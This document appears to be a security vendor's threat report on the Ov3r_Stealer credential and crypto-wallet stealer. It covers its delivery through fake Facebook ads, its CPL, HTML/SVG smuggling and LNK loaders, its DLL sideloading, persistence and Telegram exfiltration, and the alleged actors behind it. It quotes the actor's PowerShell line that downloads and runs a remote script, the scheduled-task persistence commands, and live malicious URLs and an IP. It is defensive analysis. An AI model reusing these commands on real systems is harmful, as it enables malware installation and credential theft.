Facebook Advertising Spreads Novel Malware Variant
Executive Summary
In early December, during an Advanced Continual Threat Hunt (ACTH) 
campaign investigation, Trustwave SpiderLabs discovered a new malware 
named Ov3r_Stealer. At a high level, this malware is designed to steal credentials 
and crypto wallets and send those to a Telegram channel that the threat actor 
monitors. The tactics and techniques to drop the malware and the code itself 
is not unique, but because this malware was relatively unknown at the time of 
discovery, it allowed our investigators to dig a little deeper into its backstory and 
potentially the origins of this malware. 
The initial attack vector for this malware at the time of discovery was through a Facebook job advertisement for an Account 
Manager position. Weaponized links brought the user to a malicious Discord content delivery URL, which in turn began the 
execution phase of the attack. In our victim’s environment, a Powershell script masquerading as a Windows Control Panel 
binary was executed that downloaded the malware from a GitHub site in the form of three files. During the investigation 
into the malware family, our SpiderLabs teams discovered other methods of loading the malware onto the system which 
included HTML Smuggling, SVG Smuggling, and LNK file masquerading. 
Once the malware, in the form of three files, is loaded on the system and executed, a persistence mechanism by way of 
Scheduled Task is created and the malware runs every 90 minutes. The malware is designed to exfiltrate specific types of 
data such as: GeoLocation (based on IP), hardware info, passwords, cookies, credit card information, auto-fills, browser 
extensions, crypto wallets, Office documents, and antivirus product information. Once the information is gathered, it is 
exfiltrated to a Telegram channel the threat actor is monitoring. 
What happens next is a bit of the unknown, but all this information could potentially be sold to the highest bidder, or there 
is the potential the malware, like many others before it, becomes modularized and is later used as a dropper for other 
malware or post exploit tools up to and including ransomware.
The wild chase for information on the threat actors following the technical indicators of the malware led the team to various 
aliases, communication channels, and repositories. Aliases such as ‘Liu Kong,’ ‘MR Meta,’ MeoBlackA, and ‘John Macollan’ 
were found in groups like ‘Pwn3rzs Chat,’ ‘Golden Dragon Lounge,’ ‘Data Pro,’ and ‘KGB Forums’ where many “researchers,” 
threat actors, and curious folk gather, meetup, and exchange hacks, malware, and cracked software daily. 
This report will discuss the technical elements behind the malware and some insights into the authors, communication 
channels, and repositories. Please note that on December 18, this malware became known to the public and was reported in 
VirusTotal. During the investigation, we learned of Phemedrone, an open-source malware, that shares all the characteristics 
of Ov3r_Stealer; however, it is written in a different language (C#).
The IOCs listed in this report may not be relevant to current malware attacks; however, it is always a best practice to hunt 
through your telemetry to identify any potential usage of this malware and its variants in your systems.

Stage 1 - Initial Access
As witnessed in our victim’s environment and 
a demo we found from the threat actor itself, 
the initial access and delivery of the malware 
comes in the form of a weaponized PDF file. 
The file masquerades itself as a file shared on 
OneDrive. 
There are many ways to receive the malicious 
PDF file, including the typical phishing or 
spear phishing attempts. However, our threat 
intelligence team found additional avenues the 
attackers are using to direct the victims to the 
weaponized PDF. Below is a fake Facebook 
account impersonating Amazon CEO Andy 
Jassy with a convenient clickable OneDrive link.

Once the “Access Document” is clicked from the Facebook page, a .url file is downloaded to begin 
the second stage. Using the metadata of the PDF file, SpiderLabs discovered a more direct route 
to the .url in the following job notification on Facebook for “pink women’s magazine.”
Clicking the link will direct the victim to cdn.discordapp.com to download the .url 
file as seen below:

Stage 2 - Execution
Once the Access Document is clicked, the victim is directed to a .url file to download which 
masquerades as a legitimate ‘DocuSign’ document as seen below. However, the contents of the 
document contain yet another URL redirection.
The IP address being used in the “DocuSign” file above, 51.79.185.145, was observed via Shodan 
to have SMB open and authentication disabled. 
The .url file is targeting the IP address and 
a pdf2.cpl file within a data2.zip file on the 
remote host. Generally, Windows would not 
allow this activity without some warning if the 
file was an executable binary, such as an .exe 
or .vbs, but since this is a Windows Control 
Panel (.cpl) file, Windows will allow this to occur 
without warning. 
It is safe to assume this method of attack will 
only impact Windows-based systems. Further, 
the final payload on this malware is also 
intended for Windows-based systems.

Stage 3 – Execution (Loaders)
The threat actors are actively developing this malware allowing SpiderLabs to witness the addition 
of multiple loaders which carry the victim through the final attack payload.
Loader 1 – CPL Files
Windows Control Panel files are generally used for system settings within Windows and, as such, 
are run using rundll32.exe. In the witnessed attack, the malicious .cpl file was executed using the 
following command from rundll32: shell32.dll, Control_RunDLL <.cpl path>. Instead of modifying 
system settings, the .cpl file is used to run a remote PowerShell script. 
“Powershell.exe” -nop -w hidden -c “I’’E’’X ((new-object net.webclient).downloadstring(
‘https://raw.githubusercontent.com/nateeintanan2527/Joyce_Data/main/DATA1.txt’)) 
The DATA1.txt file is an obfuscated Powershell script, deobfuscted to: 
The successful execution brings three new files to the victim system:
WerFaultSecure.exe (This is a legitimate Windows executable)
Wer.dll (This is a file that WerFaultSecure loads. This one is actually malicious)
Secure.pdf (This contains malicious code the DLL will load)
These files will be extracted from KAY.zip and hidden using attrib -h. The archive will be deleted 
and a three second sleep timer will commence. 
Loader 2 – HTML Smuggling
Pivoting from our witnessed example, we found some sample data that would indicate another 
method of executing the loaders, which involved HTML Smuggling. In this example, a weaponized 
HTML file, CustomCursor.html is used to load the CustomCursor.zip file. The ZIP file itself is 
encoded with Base64 within the HTML file:
Encoded:
This ZIP file contains:
CustomCursor.exe (This is a renamed WerFaultSecure.exe)
Wer.dll (The same malicious DLL file)
Data.ini (Malicious code loaded by DLL file)

Loader 3 – Shortcut File
In this scenario, a file masquerading as a typical text file called Attitude_Reports.txt located 
within a ZIP archive is presented to the victim. The actual file within the ZIP archive is a shortcut 
file (LNK) called Attitude_Reports.txt.lnk. Once extracted, Windows typically does not display the 
file extension so, the .lnk is dropped and it appears as a normal .txt file, as seen below:
Once opened, it will redirect the victim to the GitHub repository, as the CPL loader does, to 
download the actual payload. 
Loader 4 – SVG Smuggling
This mechanism works similarly to HTML smuggling whereby the malicious files are embedded 
within the SVG file. SVG files are Vector Graphics files typically used in Web Graphics. SpiderLabs 
discovered a redirection to “Copyright_Report.svg.” Once opened a .RAR file is embedded and 
loaded immediately.
The downloaded .RAR file contains a Windows Shortcut file (.lnk) which downloads the Powershell 
script. This method exploits WinRAR Code Execution Vulnerability (CVE-2023-38831).

Stage 4 – Final Payload
Each loader stage brings in three files which represent the final payload:
WerFaultSecure.exe (This is a legitimate Windows executable)
Wer.dll (This is a file that WerFaultSecure loads. This one is actually malicious)
Secure.pdf (This contains malicious code the DLL will load)
This combination of files is one sample set. These files can be renamed anything, but the intent is 
to execute the legitimate WerFaultSecure.exe, which in turn will call up Wer.dll by name. In this 
DLL sideloading attack, the malicious code is contained within the Wer.dll file. Once executed, the 
malware will establish persistence to ensure it is always running and exfiltrate specific data to a 
monitored Telegram channel.
Stage 5 - Persistence
In our hunt, we found the files to be copied to the C:\Users\Public\Libraries\Books folder and 
a Scheduled Task created called “Licensing2” which runs every 90 minutes with the following 
command:
/F /CREATE /TN “Licensing2” /tr “C:\Users\Public\Libraries\Books\
WerFaultSecure.exe” /sc minute /MO 90
Other versions used Licensing as the Scheduled Task name with the following commands:
/F /CREATE /TN “Licensing” /tr “C:\Users\Public\Libraries\Books\
SmartTaskbarSetup.exe” /sc minute /MO 90 
/F /CREATE /TN “Licensing” /tr “C:\Users\Public\Libraries\Books\
WerFaultSecure.exe” /sc minute /MO 90

Threat Actors
While investigating Ov3r_Stealer malware or any malware, it is important to look for clues into its 
origin and intended purpose. Attribution can be difficult, but following any leads is important work 
to gain insights into potential future attack campaigns and/or additional malware variants.
@JohnMacollan
Our first pivot point was the @JohnMacollan username. This account is associated with the 
Telegram channel used for exfiltration. While researching this account, the SpiderLabs team 
discovered another usage of this account on the Pwn3rzs chat forum. That chat on this forum is 
almost exclusively related to cracking software. One of the many applications they have cracked 
includes Cobalt Strike, which is widely used by threat actors in many breaches worldwide. The 
disclaimer and mission statement for Pwn3rzs is that everything is for educational purposes only. 
In the example below, they offer the files up on ponies.cloud.

Liu Kong
Like the @John Macollan username, we extrapolated Liu Kong from the Telegram Bot IDs. 
SpiderLabs also found this username associated with the Pwn3rzs chat mentioned above and one 
other called KGB Forum, hosted at hxxp://wdkiller.com. The wdkiller site claims to offer AV bypass 
with Ring0 exploits and claims to offer bypasses for Windows Defender and other EDR products, 
as seen below:

From this site, our team discovered a video demo of the Ov3r_Stealer malware being used or 
tested. Below are some screenshots from that video:

It is unclear if this demo was serving the purpose of soliciting the malware or just showing off. 
At the time of discovery, the threat actor was not asking for payment, but it’s important to note 
those conversations would most likely have happened outside of that forum. Our investigators 
identified three groups on the Telegram channels that have affiliations with the Liu Kong account. 
As depicted below, those groups are Golden Dragon Lounge, Data Pro, and Golden Dragon. 
Additionally, two other aliases, MR Meta and MeoBlackA become tied to Liu Kong.

At this point, it is believed the MeoBlackA alias is controlled by the threat actor, and they 
frequently change their alias. Strangely, the observations thus far have been predominately in 
Vietnamese but with the MeoBlackA alias, the introduction of Russian and the French flag.
Additional Telegram groups the MeoBlackA alias is associated with can be seen below:

Phemedrone Malware
As we peel back the layers into this malware and the players behind it, we have discovered that 
the Ov3r_Stealer malware is very similar to another stealer malware called Phemedrone. 
This malware has recently been reported, and it may be that Phemedrone was re-purposed 
and renamed to Ov3r_Stealer. The main difference between the two is that Phemedrone is 
written in C#.

Conclusion
At this time, there have been a couple of articles released recently on Phemedrone and since then, 
the GitHub repositories for both Phemedrone and Ov3r_Stealer have been taken down. The threat 
actor we were following during this investigation is now leveraging those write-ups as ‘street-cred’ 
for its malware-writing business. 
Trustwave has not seen wide-sweeping campaigns using this malware; however, it was under 
continual development and likely still is. Given the open-source nature of Phemedrone, its code 
will likely re-surface in other malware at some point. As Ov3r_Stealer has been actively developed 
with multiple loader techniques, we may see this one eventually be sold or used in other 
campaigns in the future. With Liu Kong’s latest statements, they will look to get better at fileless 
malware.
To mitigate against these types of attacks, Trustwave recommends:
•	 Active and engaging Security Awareness Programs
•	 Regular Application and Service audits and baselining
•	 Application patching
•	 Run continuous Threat Hunting through your environments for undetected compromises.
